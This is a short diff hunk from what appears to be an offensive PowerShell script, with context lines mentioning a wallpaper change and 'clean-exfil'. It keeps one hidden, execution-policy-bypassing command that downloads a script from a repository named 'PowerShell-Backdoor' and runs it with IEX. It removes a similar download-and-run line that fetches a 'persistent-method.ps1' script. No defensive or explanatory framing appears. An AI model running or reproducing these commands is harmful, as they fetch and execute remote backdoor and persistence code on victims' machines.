@@ -416,4 +416,3 @@ Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
 
 clean-exfil
 powershell.exe -Windowstyle Hidden -Exec Bypass -NonI -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rude90/PowerShell-Backdoor/main/mfJtegnY.ps1');"
-powershell.exe -Windowstyle Hidden -Exec Bypass -NonI -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rude90/only-powershell/main/persistent-method.ps1');"
